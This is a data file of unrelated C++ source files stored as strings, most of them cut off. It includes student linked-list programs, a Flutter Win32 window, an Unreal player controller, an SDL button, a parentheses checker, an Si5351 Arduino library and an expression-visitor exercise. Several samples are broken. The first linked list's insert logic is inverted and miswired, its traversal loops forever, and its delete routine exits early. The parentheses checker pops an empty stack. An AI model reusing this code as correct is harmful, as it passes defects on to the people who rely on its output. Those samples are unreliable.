    "#include <iostream>\n#include <string>\nusing namespace std;\n\nstruct Node\n{\n    int noMhs;\n    string name;\n    Node* next;\n    Node* prev;\n};\n\nNode* START = NULL;\n\nvoid addNode(){\n    Node* newNode = new Node(); // step 1 : create a new node\n    cout << \"\\nEnter the roll number of the student : \";\n    cin >> newNode->noMhs;      // assign value to the data field of the new node\n    cout << \"\\nEnter the name of the student : \";\n    cin >> newNode->name;      // assign value to the data field of the new node\n\n    // Insert the nw node in the list\n    if (START != NULL && newNode->noMhs == START->noMhs) {\n\n        if (START != NULL && newNode->noMhs == START->noMhs){\n            cout << \"\\033[31mDuplicate roll not allowed\\033]0m\" << endl;\n            return;\n        }\n        // if the list empty, make the new node the START\n        newNode->next = START; // step 3 : make the new node point to the first node\n        if (START != NULL) {\n            START->prev = newNode; // step 4 : make the first node point to the new node\n        }\n        newNode->prev = NULL; // step 5 : make the new node point to NULL\n        START = newNode; // step 6 : make the new node the first node\n    }\n    else{\n        // insert the new node in the middle or at the end\n        Node *current = START; // step 1.a : start from the first node\n        Node *previous = NULL; // step 1.b : previous node is NULL initially\n\n        while (current != NULL && current->noMhs < newNode->noMhs) // step 1.c traverse the list to find the correct position\n        {\n            previous = current; // step 1.d : move the previous to the current node\n            current = current->next; // step 1.e : move the currrent to the next node\n        }\n\n        newNode->next = previous; // step 4 : make the next field of the new node point to current\n        newNode->prev = previous; // step 5 : make the previous field of the new node point to previous\n\n        if (current != NULL)\n        {\n            current->prev = newNode; // step 6 : make the next previous field of the current node point ti the new world\n        }\n\n        if (previous != NULL)\n        {\n            previous->next =newNode; // step 7 : make the next field of the previous node point to the new node\n        }\n        else\n        {\n            // if previous is still NULL, it means newNode is now the first node\n            START = newNode;\n        }\n    }\n    \n}\n\nbool search(int rollNo, Node **previous, Node **current)\n{\n    *previous = NULL;\n    *current = START;\n    while (*current != NULL && (*current)->noMhs != rollNo)\n    {\n        *previous = * current;\n        *current = (*current)->next;\n    }\n    return (*current != NULL);\n}\n\nvoid deleteNode()\n{\n    Node *previous, *current;\n    int rollNo;\n\n    cout <<\"\\nEnter the roll number of the student whose record is to be deleted : \";\n    cin >> rollNo; // step 3 : get the roll number to be deleted\n\n    if (START == NULL)\n    {\n        cout << \"List is empty\" << endl;\n        return;\n    }\n\n    current = START; // step 1 : start from the first node\n    previous = NULL;\n\n    // Locate the node to be deleted\n    while (current != NULL && current->noMhs != rollNo)\n    {\n        cout << \"\\033[31mThe record wtih toll number \" << rollNo << \" not found\\033[0m\" << endl;\n        return;\n    }\n\n    // Node to be deleted is the first node\n    if (current == START)\n    {\n        START = START->next; // step 2 : update the START pointer\n        if (START != NULL)\n        {\n           START->prev = NULL; \n        }\n    }\n    else\n    { // Node to be deletd is not the first node\n        previous->next = current->next;\n        if (current->next != NULL)\n        { // if there's a succesor, update is prev pointer\n            current->next->prev = previous;\n        } \n    }\n\n    // release the memory of the node marked as current\n    delete current;\n    cout << \"\\x1b[32mRecord with roll number \" << rollNo << \" deleted\\x1b[0m\" << endl;\n}\n\nbool listEmpty()\n{\n    return (START == NULL);\n}\n\nvoid traverse()\n{\n    if (listEmpty())\n        cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecords in ascending order of roll number are : \" << endl;\n        Node *currentNode = START; // step 1\n        while (currentNode != NULL) // step 2\n        {\n            cout << currentNode->noMhs << \" \" << currentNode->name << endl; // step 3\n        }\n    }\n}\n\nvoid revtravese()\n{\n    if (listEmpty())\n    cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecords in descending order of roll number are : \" << endl;\n        Node *currentNode = START;\n        while (currentNode->next != NULL)\n            currentNode = currentNode->next;\n\n        while (currentNode != NULL)\n        {\n            cout << currentNode->noMhs << \" \" << currentNode->name << endl;\n            currentNode = currentNode->prev;\n        }\n        \n    }\n    \n}\nvoid searchData(){\n    if (listEmpty() == true)\n    {\n        cout << \"\\nList is empty\" << endl;\n    }\n    Node ",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "// Copyright Epic Games, Inc. All Rights Reserved.\n\n#include \"SpringJam24PlayerController.h\"\n#include \"GameFramework/Pawn.h\"\n#include \"Blueprint/AIBlueprintHelperLibrary.h\"\n#include \"NiagaraSystem.h\"\n#include \"NiagaraFunctionLibrary.h\"\n#include \"SpringJam24Character.h\"\n#include \"Engine/World.h\"\n#include \"EnhancedInputComponent.h\"\n#include \"EnhancedInputSubsystems.h\"\n\nASpringJam24PlayerController::ASpringJam24PlayerController()\n{\n\tbShowMouseCursor = true;\n\tDefaultMouseCursor = EMouseCursor::Default;\n\tCachedDestination = FVector::ZeroVector;\n\tFollowTime = 0.f;\n\n\tPlayerAbilitySystem = CreateDefaultSubobject<UAbilitySystemComponent>(\"PlayerAbilitySystem\");\n}\n\nvoid ASpringJam24PlayerController::BeginPlay()\n{\n\t// Call the base class  \n\tSuper::BeginPlay();\n\n\t//Add Input Mapping Context\n\tif (UEnhancedInputLocalPlayerSubsystem* Subsystem = ULocalPlayer::GetSubsystem<UEnhancedInputLocalPlayerSubsystem>(GetLocalPlayer()))\n\t{\n\t\tSubsystem->AddMappingContext(DefaultMappingContext, 0);\n\t}\n\n\tPlayerAbilitySystem->InitAbilityActorInfo(this, this);\n}\n\nvoid ASpringJam24PlayerController::SetupInputComponent()\n{\n\t// set up gameplay key bindings\n\tSuper::SetupInputComponent();\n\n\t// Set up action bindings\n\tif (UEnhancedInputComponent* EnhancedInputComponent = CastChecked<UEnhancedInputComponent>(InputComponent))\n\t{\n\t\t// Setup mouse input events\n\t\tEnhancedInputComponent->BindAction(SetDestinationClickAction, ETriggerEvent::Started, this, &ASpringJam24PlayerController::OnInputStarted);\n\t\tEnhancedInputComponent->BindAction(SetDestinationClickAction, ETriggerEvent::Triggered, this, &ASpringJam24PlayerController::OnSetDestinationTriggered);\n\t\tEnhancedInputComponent->BindAction(SetDestinationClickAction, ETriggerEvent::Completed, this, &ASpringJam24PlayerController::OnSetDestinationReleased);\n\t\tEnhancedInputComponent->BindAction(SetDestinationClickAction, ETriggerEvent::Canceled, this, &ASpringJam24PlayerController::OnSetDestinationReleased);\n\n\t\t// Setup touch input events\n\t\tEnhancedInputComponent->BindAction(SetDestinationTouchAction, ETriggerEvent::Started, this, &ASpringJam24PlayerController::OnInputStarted);\n\t\tEnhancedInputComponent->BindAction(SetDestinationTouchAction, ETriggerEvent::Triggered, this, &ASpringJam24PlayerController::OnTouchTriggered);\n\t\tEnhancedInputComponent->BindAction(SetDestinationTouchAction, ETriggerEvent::Completed, this, &ASpringJam24PlayerController::OnTouchReleased);\n\t\tEnhancedInputComponent->BindAction(SetDestinationTouchAction, ETriggerEvent::Canceled, this, &ASpringJam24PlayerController::OnTouchReleased);\n\t}\n}\n\nvoid ASpringJam24PlayerController::OnInputStarted()\n{\n\tStopMovement();\n}\n\n// Triggered every frame when the input is held down\nvoid ASpringJam24PlayerController::OnSetDestinationTriggered()\n{\n\t// We flag that the input is being pressed\n\tFollowTime += GetWorld()->GetDeltaSeconds();\n\t\n\t// We look for the location in the world where the player has pressed the input\n\tFHitResult Hit;\n\tbool bHitSuccessful = false;\n\tif (bIsTouch)\n\t{\n\t\tbHitSuccessful = GetHitResultUnderFinger(ETouchIndex::Touch1, ECollisionChannel::ECC_Visibility, true, Hit);\n\t}\n\telse\n\t{\n\t\tbHitSuccessful = GetHitResultUnderCursor(ECollisionChannel::ECC_Visibility, true, Hit);\n\t}\n\n\t// If we hit a surface, cache the location\n\tif (bHitSuccessful)\n\t{\n\t\tCachedDestination = Hit.Location;\n\t}\n\t\n\t// Move towards mouse pointer or touch\n\tAPawn* ControlledPawn = GetPawn();\n\tif (ControlledPawn != nullptr)\n\t{\n\t\tFVector WorldDirection = (CachedDestination - ControlledPawn->GetActorLocation()).GetSafeNormal();\n\t\tControlledPawn->AddMovementInput(WorldDirection, 1.0, false);\n\t}\n}\n\nvoid ASpringJam24PlayerController::OnSetDestinationReleased()\n{\n\t// If it was a short press\n\tif (FollowTime <= ShortPressThreshold)\n\t{\n\t\t// We move there and spawn some particles\n\t\tUAIBlueprintHelperLibrary::SimpleMoveToLocation(this, CachedDestination);\n\t\tUNiagaraFunctionLibrary::SpawnSystemAtLocation(this, FXCursor, CachedDestination, FRotator::ZeroRotator, FVector(1.f, 1.f, 1.f), true, true, ENCPoolMethod::None, true);\n\t}\n\n\tFollowTime = 0.f;\n}\n\n// Triggered every frame when the input is held down\nvoid ASpringJam24PlayerController::OnTouchTriggered()\n{\n\tbIsTouch = true;\n\tOnSetDestinationTriggered();\n}\n\nvoid ASpringJam24PlayerController::OnTouchReleased()\n{\n\tbIsTouch = false;\n\tOnSetDestinationReleased();\n}\n",
    "#include <iostream>\n#include <string>\nusing namespace std; \n\nstruct Node\n{\n\tint noMhs; \n\tstring name; \n\tNode* next; \n\tNode* prev; \n};\n\nNode *START = NULL;\n\nvoid addNode() {\n\tNode* newNode = new Node();  // step 1: create a new node \n\tcout << \"\\nEnter the roll number of the student: \";\n\tcin >> newNode->noMhs;  // Assign value to the data field of the new node \n\tcout << \"\\nEnter the name of the student: \";\n\tcin >> newNode->name;  //Assign value to the data field of the new node \n\n\n\t// Insert the new node in the list \n\tif (START == NULL || newNode->noMhs <= START->noMhs) { // step 2: insert the new node \n\n\t\tif (START != NULL && newNode->noMhs == START->noMhs) {\n\t\t\tcout << \"\\033[31Dumplicate roll numbers not allowed\\033[0m\" << endl;\n\t\t\treturn;\n\t\t}\n\t\t// if the list is empty, make the new node the START \n\t\tnewNode->next = START;  // step 3: make the new node point to the first node \n\t\tif (START != NULL) {\n\t\t\tSTART->prev = newNode; \t// STEP 4: make the first node point to the new node \n\n\t\t}\n\t\tnewNode->prev = NULL;\t// step 5: make the new node point to NULL\n\t\tSTART = newNode;\t\t// step 6: make the new node the first node \n\t}\n\telse {\n\t\t// insert the new node in the middle or at the end \n\t\tNode* current = START;  // step 1.a: start from the first node \n\t\tNode* previous = NULL;  // step 1.b: previous node is NULL initially \n\n\t\twhile (current != NULL && current->noMhs < newNode->noMhs) { // step 1.c: traverse \n\t\t\tprevious = current; // step 1.d: move the previous to the current node \n\t\t\tcurrent = current->next;  // step 1>e: move the current to the next node \n\t\t}\n\n\t\tnewNode->next = current; // step 4. Make the next field of the new node point\n\t\tnewNode->prev = previous; // step 5. make the previous field of the new node point \n\n\t\tif (current != NULL) {\n\t\t\tcurrent->prev = newNode; //step 6. Make the previous field of the current new node \n\t\t}\n\n\t\tif (previous != NULL) {\n\t\t\tprevious->next = newNode; // step 7. Make the next field of the previous node \n\t\t}\n\t\telse {\n\t\t\t// if previous is still NULL, it means newNode is now the first node \n\t\t\tSTART = newNode;\n\t\t}\n\t}\n}\nbool search(int rollNo, Node **previous, Node **current)\n{\n\t*previous = NULL;\n\t*current = START;\n\twhile (*current != NULL && (*current)->noMhs != rollNo)\n\t{\n\t\t*previous = *current;\n\t\t*current = (*current)->next;\n\t}\n\treturn (*current != NULL);\n}\n\nvoid deleteNode()\n{\n\tNode* previous, * current; // \n\tint rollNo;\n\n\tcout << \"\\nEnter the roll number of the student whose record is to be deleted: \";\n\tcin >> rollNo; // step 3: get the roll number to be deleted \n\n\tif (START == NULL)\n\t{\n\t\tcout << \"List is empty\" << endl;\n\t\treturn;\n\t}\n\n\tcurrent = START; // Step 1: start from the first node \n\tprevious = NULL;\n\n\t// Locate the node to be deleted \n\twhile (current != NULL && current->noMhs != rollNo)\n\t{\n\t\tprevious = current;\n\t\tcurrent = current->next;\n\t}\n\n\tif (current == NULL)\n\t{\n\t\tcout << \"\\033[31mthe record with roll number \" << rollNo << \" not found\\033[0m\" << endl;\n\t\treturn;\n\t}\n\n\t// Node to be deleted is the first node \n\tif (current == START)\n\t{\n\t\tSTART = START->next; //step 2: update the START pointer\n\t\tif (START != NULL)\n\t\t{\t\t\t\t\t\t//\n\t\t\tSTART->prev = NULL; // step \n\t\t}\n\t}\n\telse\n\t{ // Node to be deleted is not the first node \n\t\tprevious->next = current->prev;\n\t\tif (current->next != NULL)\n\t\t{ // If there's a successor, update its prev pointer \n\t\t\tcurrent->next->prev = previous;\n\t\t}\n\t}\n\n\t// Release the memory of the node marked as current \n\tdelete current;\n\tcout << \"\\x1b[32mRecord with roll number \" << rollNo << \" deleted\\x1b[0m\" << endl;\n}\n\nbool listEmpty()\n{\n\treturn (START == NULL);\n}\nvoid traverse()\n{\n\tif (listEmpty())\n\t\tcout << \"\\nList is empty\" << endl; \n\telse\n\t{\n\t\tcout << \"\\nRecords in asceding order of roll number are:\" << endl;\n\t\tNode* currentNode = START;  //step 1 \n\t\twhile (currentNode != NULL)\t//step 2\n\t\t{\n\t\t\tcout << currentNode->noMhs << \" \" << currentNode->name << endl; //step 3\n\t\t\tcurrentNode = currentNode->next;\t\t\t\t\t\t\t\t// step 4\n\t\t}\n\t}\n}\nvoid revtraverse()\n{\n\n\tif (listEmpty())\n\t\tcout << \"\\nRecords in descending order of roll number are:\" << endl;\n\telse\n\t{\n\t\tcout << \"\\nRecords im descending order of roll number are:\" << endl;\n\t\tNode* currentNode = START;\n\t\twhile (currentNode->next != NULL)\n\t\t\tcurrentNode = currentNode->next;\n\t\twhile (currentNode != NULL)\n\t\t{\n\t\t\tcout << currentNode->noMhs << \" \" << currentNode->name << endl;\n\t\t\tcurrentNode = currentNode->prev;\n\t\t}\n\n\t}\n}\n\nvoid searchData()\n{\n\tif (listEmpty() == true)\n\t{\n\t\tcout << \"\\nList is empty\" << endl;\n\t}\n\tNode* prev, *curr; \n\tprev = curr = NULL; \n\tcout << \"\\nEnter the roll number of the student whose record you want to seacrh: \"; \n\tint num; \n\tcin >> num; \n\tif (search(num, &prev, &curr) == false)\n\t\tcout << \"\\nRecord not found\" << endl; \n\telse\n\t{\n\t\tcout << \"\\nRecord found\" << endl; \n\t\tcout << \"\\nRoll number: \" << curr->noMhs << endl; \n\t\tcout << \"\\nName: \" << curr->name << endl; \n\t}\n}\nint main()\n{\n\twhile (true)\n\t{\n\t\ttry\n\t\t{\n\t\t\tcout << \"\\nMenu\" << endl;\n\t\t\tcout << \"1. Add a record to the list\" << endl;\n\t\t\tcout << \"",
    "#include \"Button.h\"\n\nButton::Button()\n{\n\n}\n\nButton::Button(int x, int y, int w, int h, int tool)\n{\n    topColour = 100;\n    shadowColour = 50;\n\n    xPos = x;\n    yPos = y;\n    width = w;\n    height = h;\n    assignedTool = tool;\n}\n\n\n// Return the ID of this button if it was clicked\nint Button::checkIfClicked(int mPosX, int mPosY)\n{\n    // Check if mouse coords are within region\n    if (mPosX >= xPos && mPosY >= yPos && mPosX < xPos+width && mPosY < yPos+height) {\n        return assignedTool;\n    }\n    else {\n        return -1;\n    }\n}\n\n\nvoid Button::Render(SDL_Renderer* aRenderer)\n{\n    if (isToggled) {\n        // Use Toggle-On sprite here\n        shadowColour = 100;\n        topColour = 50;\n    }\n    else {\n        // Use Toggle-Off sprite here\n        shadowColour = 50;\n        topColour = 100;\n    }\n\n    SDL_Rect shadowRect = { xPos, yPos, width + 3, height + 3 };\n    SDL_SetRenderDrawColor(aRenderer, shadowColour, shadowColour, shadowColour, 255);\n    SDL_RenderFillRect(aRenderer, &shadowRect);\n\n    SDL_Rect rect = { xPos, yPos, width, height };\n    SDL_SetRenderDrawColor(aRenderer, topColour, topColour, topColour, 255);\n    SDL_RenderFillRect(aRenderer, &rect);\n}\n",
    "#include <iostream>\r\n#include <iomanip>\r\n#include <stack>\r\n#include <string>\r\nusing namespace std;\r\n\r\n// Function used to check if the parentheses in the expression are balanced or not\r\nbool balancedParentheses(string expr)\r\n{\r\n    // Stack of characters named p because the expression will contain parentheses\r\n    stack<char> p;\r\n    // for loop used in order to traverse the expression of parentheses\r\n    for (int i = 0; i < expr.length(); i++)\r\n    {\r\n        // If the expression contains open parentheses, meaning '('\r\n        if (expr[i] == '(')\r\n            p.push(expr[i]);\r\n        else\r\n            p.pop();\r\n    }\r\n    // Return empty stack\r\n    return (p.empty());\r\n}\r\n\r\n// main function, which will take the input from the user and display the output\r\n// of whether or not the expression contains balanced parentheses\r\nint main()\r\n{\r\n    string parenthesesExpression;\r\n    // The user inputting the parentheses expression that either does or does not have balanced parentheses.\r\n    cin >> parenthesesExpression;\r\n    if (balancedParentheses(parenthesesExpression))\r\n        // Output that will be displayed if the expression has balanced parentheses.\r\n        cout << \"Balanced\";\r\n    else\r\n        // Output that will be displayed if the expression's parentheses are not balanced.\r\n        cout << \"Not Balanced\";\r\n    return 0;\r\n}\r\n",
    "/*\n * si5351.cpp - Si5351 library for Arduino\n *\n * Copyright (C) 2015 - 2019 Jason Milldrum <milldrum@gmail.com>\n *                           Dana H. Myers <k6jq@comcast.net>\n *\n * Some tuning algorithms derived from clk-si5351.c in the Linux kernel.\n * Sebastian Hesselbarth <sebastian.hesselbarth@gmail.com>\n * Rabeeh Khoury <rabeeh@solid-run.com>\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <http://www.gnu.org/licenses/>.\n */\n\n#include <stdint.h>\n\n#include \"Arduino.h\"\n#include \"Wire.h\"\n#include \"si5351.h\"\n\n\n/********************/\n/* Public functions */\n/********************/\n\nSi5351::Si5351(uint8_t i2c_addr):\n\ti2c_bus_addr(i2c_addr)\n{\n\txtal_freq[0] = SI5351_XTAL_FREQ;\n\n\t// Start by using XO ref osc as default for each PLL\n\tplla_ref_osc = SI5351_PLL_INPUT_XO;\n\tpllb_ref_osc = SI5351_PLL_INPUT_XO;\n\tclkin_div = SI5351_CLKIN_DIV_1;\n}\n\n/*\n * init(uint8_t xtal_load_c, uint32_t ref_osc_freq, int32_t corr)\n *\n * Setup communications to the Si5351 and set the crystal\n * load capacitance.\n *\n * xtal_load_c - Crystal load capacitance. Use the SI5351_CRYSTAL_LOAD_*PF\n * defines in the header file\n * xo_freq - Crystal/reference oscillator frequency in 1 Hz increments.\n * Defaults to 25000000 if a 0 is used here.\n * corr - Frequency correction constant in parts-per-billion\n *\n * Returns a boolean that indicates whether a device was found on the desired\n * I2C address.\n *\n */\nbool Si5351::init(uint8_t xtal_load_c, uint32_t xo_freq, int32_t corr)\n{\n\t// Start I2C comms\n\tWire.begin();\n\n\t// Check for a device on the bus, bail out if it is not there\n\tWire.beginTransmission(i2c_bus_addr);\n\tuint8_t reg_val;\n  reg_val = Wire.endTransmission();\n\n\tif(reg_val == 0)\n\t{\n\t\t// Wait for SYS_INIT flag to be clear, indicating that device is ready\n\t\tuint8_t status_reg = 0;\n\t\tdo\n\t\t{\n\t\t\tstatus_reg = si5351_read(SI5351_DEVICE_STATUS);\n\t\t} while (status_reg >> 7 == 1);\n\n\t\t// Set crystal load capacitance\n\t\tsi5351_write(SI5351_CRYSTAL_LOAD, (xtal_load_c & SI5351_CRYSTAL_LOAD_MASK) | 0b00010010);\n\n\t\t// Set up the XO reference frequency\n\t\tif (xo_freq != 0)\n\t\t{\n\t\t\tset_ref_freq(xo_freq, SI5351_PLL_INPUT_XO);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tset_ref_freq(SI5351_XTAL_FREQ, SI5351_PLL_INPUT_XO);\n\t\t}\n\n\t\t// Set the frequency calibration for the XO\n\t\tset_correction(corr, SI5351_PLL_INPUT_XO);\n\n\t\treset();\n\n\t\treturn true;\n\t}\n\telse\n\t{\n\t\treturn false;\n\t}\n}\n\n/*\n * reset(void)\n *\n * Call to reset the Si5351 to the state initialized by the library.\n *\n */\nvoid Si5351::reset(void)\n{\n\t// Initialize the CLK outputs according to flowchart in datasheet\n\t// First, turn them off\n\tsi5351_write(16, 0x80);\n\tsi5351_write(17, 0x80);\n\tsi5351_write(18, 0x80);\n\tsi5351_write(19, 0x80);\n\tsi5351_write(20, 0x80);\n\tsi5351_write(21, 0x80);\n\tsi5351_write(22, 0x80);\n\tsi5351_write(23, 0x80);\n\n\t// Turn the clocks back on...\n\tsi5351_write(16, 0x0c);\n\tsi5351_write(17, 0x0c);\n\tsi5351_write(18, 0x0c);\n\tsi5351_write(19, 0x0c);\n\tsi5351_write(20, 0x0c);\n\tsi5351_write(21, 0x0c);\n\tsi5351_write(22, 0x0c);\n\tsi5351_write(23, 0x0c);\n\n\t// Set PLLA and PLLB to 800 MHz for automatic tuning\n\tset_pll(SI5351_PLL_FIXED, SI5351_PLLA);\n\tset_pll(SI5351_PLL_FIXED, SI5351_PLLB);\n\n\t// Make PLL to CLK assignments for automatic tuning\n\tpll_assignment[0] = SI5351_PLLA;\n\tpll_assignment[1] = SI5351_PLLA;\n\tpll_assignment[2] = SI5351_PLLA;\n\tpll_assignment[3] = SI5351_PLLA;\n\tpll_assignment[4] = SI5351_PLLA;\n\tpll_assignment[5] = SI5351_PLLA;\n\tpll_assignment[6] = SI5351_PLLB;\n\tpll_assignment[7] = SI5351_PLLB;\n\n\tset_ms_source(SI5351_CLK0, SI5351_PLLA);\n\tset_ms_source(SI5351_CLK1, SI5351_PLLA);\n\tset_ms_source(SI5351_CLK2, SI5351_PLLA);\n\tset_ms_source(SI5351_CLK3, SI5351_PLLA);\n\tset_ms_source(SI5351_CLK4, SI5351_PLLA);\n\tset_ms_source(SI5351_CLK5, SI5351_PLLA);\n\tset_ms_source(SI5351_CLK6, SI5351_PLLB);\n\tset_ms_source(SI5351_CLK7, SI5351_PLLB);\n\n\t// Reset the VCXO param\n\tsi5351_write(SI5351_VXCO_PARAMETERS_LOW, 0);\n\tsi5351_write(SI5351_VXCO_PARAMETERS_MID, 0);\n\tsi5351_write(SI5351_VXCO_PARAMETERS_HIGH, 0);\n\n\t// Then reset the PLLs\n\tpll_reset(SI5351_PLLA);\n\tpll_reset(SI5351_PLLB);\n\n\t// Set initial frequencies\n\tuint8_t i;\n\tfor(i = 0; i < 8; i++)\n\t{\n\t\tclk_freq[i] = 0;\n\t\toutput_enable((enum si5351_clock)i, 0);\n\t\tclk_first_set[i] = false;\n\t}\n}\n\n/*\n * set_freq(uint64_t freq, enum si5351_clock clk)\n *\n * Sets the clock frequency of the specified CLK output.\n * Frequency range of 8 kHz to 150 MHz\n *\n * freq - Output frequency in Hz\n * clk - Clock output\n *   (use the si5351_clock enum)\n *",
    "\ufeff#include <iostream>\n#include <cassert>\n#include <string> \nusing namespace std;\n\nstruct Transformer;\nstruct Number;\nstruct BinaryOperation;\nstruct FunctionCall;\nstruct Variable;\n\nstruct Expression //\u0431\u0430\u0437\u043e\u0432\u0430\u044f \u0430\u0431\u0441\u0442\u0440\u0430\u043a\u0442\u043d\u0430\u044f \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u0430\n{\n\tvirtual ~Expression() { } //\u0432\u0438\u0440\u0442\u0443\u0430\u043b\u044c\u043d\u044b\u0439 \u0434\u0435\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\n\tvirtual double evaluate() const = 0; //\u0430\u0431\u0441\u0442\u0440\u0430\u043a\u0442\u043d\u044b\u0439 \u043c\u0435\u0442\u043e\u0434 \u00ab\u0432\u044b\u0447\u0438\u0441\u043b\u0438\u0442\u044c\u00bb\n\tvirtual Expression* transform(Transformer* tr) const = 0;\n\tvirtual std::string print() const = 0;//\u0430\u0431\u0441\u0442\u0440\u0430\u043a\u0442\u043d\u044b\u0439 \u043c\u0435\u0442\u043e\u0434 \u043f\u0435\u0447\u0430\u0442\u044c\n};\n\nstruct Transformer //pattern Visitor\n{\n\tvirtual ~Transformer() {}\n\tvirtual Expression* transformNumber(Number const*) = 0;\n\tvirtual Expression* transformBinaryOperation(BinaryOperation const*) = 0;\n\tvirtual Expression* transformFunctionCall(FunctionCall const*) = 0;\n\tvirtual Expression* transformVariable(Variable const*) = 0;\n};\n\nstruct Number : Expression // \u0441\u0442\u0443\u043a\u0442\u0443\u0440\u0430 \u00ab\u0427\u0438\u0441\u043b\u043e\u00bb\n{\n\tNumber(double value) : value_(value) {} //\u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\n\tdouble value() const { return value_; } // \u043c\u0435\u0442\u043e\u0434 \u0447\u0442\u0435\u043d\u0438\u044f \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u0447\u0438\u0441\u043b\u0430\n\tdouble evaluate() const { return value_; } // \u0440\u0435\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0432\u0438\u0440\u0442\u0443\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u043c\u0435\u0442\u043e\u0434\u0430 \u00ab\u0432\u044b\u0447\u0438\u0441\u043b\u0438\u0442\u044c\u00bb\n\t~Number() 